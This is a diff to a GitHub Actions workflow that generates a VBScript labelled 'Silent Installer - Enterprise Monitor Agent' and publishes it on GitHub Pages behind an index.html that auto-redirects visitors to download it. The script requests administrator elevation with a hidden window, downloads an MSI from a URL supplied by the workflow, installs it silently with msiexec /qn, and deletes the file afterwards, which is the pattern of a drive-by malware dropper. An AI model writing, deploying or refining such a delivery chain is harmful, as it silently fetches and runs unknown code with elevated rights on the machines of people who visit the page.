@@ -21,50 +21,45 @@ jobs:
         
         echo "Creating VBS with link: $current_link"
         
-        # Create the VBS file with your actual content
-        cat > installer.vbs << 'EOF'
-' --------------------------------------------------------------------------
-'  Silent Installer - Enterprise Monitor Agent
-' --------------------------------------------------------------------------
-Option Explicit
-
-' Check for elevation
-If Not WScript.Arguments.Named.Exists("elevated") Then
-    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 0
-    WScript.Quit
-End If
-
-Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell
-strUrl = "CURRENT_LINK_PLACEHOLDER"
-strTemp = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
-strFile = strTemp & "\agent_installer.msi"
-
-' Download
-Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
-objXMLHTTP.open "GET", strUrl, False
-objXMLHTTP.send()
-
-If objXMLHTTP.Status = 200 Then
-    Set objADOStream = CreateObject("ADODB.Stream")
-    objADOStream.Open
-    objADOStream.Type = 1
-    objADOStream.Write objXMLHTTP.ResponseBody
-    objADOStream.Position = 0
-    objADOStream.SaveToFile strFile, 2
-    objADOStream.Close
-
-    ' Install
-    Set objShell = CreateObject("WScript.Shell")
-    objShell.Run "msiexec /i """ & strFile & """ /quiet /qn /norestart", 0, True
-
-    ' Cleanup
-    Set objFSO = CreateObject("Scripting.FileSystemObject")
-    If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile
-End If
-EOF
-        
-        # Replace the placeholder with the actual link
-        sed -i "s|CURRENT_LINK_PLACEHOLDER|$current_link|g" installer.vbs
+        # Create the VBS file using echo commands
+        echo "' --------------------------------------------------------------------------" > installer.vbs
+        echo "'  Silent Installer - Enterprise Monitor Agent" >> installer.vbs
+        echo "' --------------------------------------------------------------------------" >> installer.vbs
+        echo "Option Explicit" >> installer.vbs
+        echo "" >> installer.vbs
+        echo "' Check for elevation" >> installer.vbs
+        echo "If Not WScript.Arguments.Named.Exists(\"elevated\") Then" >> installer.vbs
+        echo "    CreateObject(\"Shell.Application\").ShellExecute \"wscript.exe\", \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevated\", \"\", \"runas\", 0" >> installer.vbs
+        echo "    WScript.Quit" >> installer.vbs
+        echo "End If" >> installer.vbs
+        echo "" >> installer.vbs
+        echo "Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell" >> installer.vbs
+        echo "strUrl = \"$current_link\"" >> installer.vbs
+        echo "strTemp = CreateObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%TEMP%\")" >> installer.vbs
+        echo "strFile = strTemp & \"\\agent_installer.msi\"" >> installer.vbs
+        echo "" >> installer.vbs
+        echo "' Download" >> installer.vbs
+        echo "Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\")" >> installer.vbs
+        echo "objXMLHTTP.open \"GET\", strUrl, False" >> installer.vbs
+        echo "objXMLHTTP.send()" >> installer.vbs
+        echo "" >> installer.vbs
+        echo "If objXMLHTTP.Status = 200 Then" >> installer.vbs
+        echo "    Set objADOStream = CreateObject(\"ADODB.Stream\")" >> installer.vbs
+        echo "    objADOStream.Open" >> installer.vbs
+        echo "    objADOStream.Type = 1" >> installer.vbs
+        echo "    objADOStream.Write objXMLHTTP.ResponseBody" >> installer.vbs
+        echo "    objADOStream.Position = 0" >> installer.vbs
+        echo "    objADOStream.SaveToFile strFile, 2" >> installer.vbs
+        echo "    objADOStream.Close" >> installer.vbs
+        echo "" >> installer.vbs
+        echo "    ' Install" >> installer.vbs
+        echo "    Set objShell = CreateObject(\"WScript.Shell\")" >> installer.vbs
+        echo "    objShell.Run \"msiexec /i \"\"\" & strFile & \"\"\" /quiet /qn /norestart\", 0, True" >> installer.vbs
+        echo "" >> installer.vbs
+        echo "    ' Cleanup" >> installer.vbs
+        echo "    Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" >> installer.vbs
+        echo "    If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile" >> installer.vbs
+        echo "End If" >> installer.vbs
         
         # Create index.html for GitHub Pages
         echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=installer.vbs"></head><body><p>If not redirected, <a href="installer.vbs">click here</a></p></body></html>' > index.html
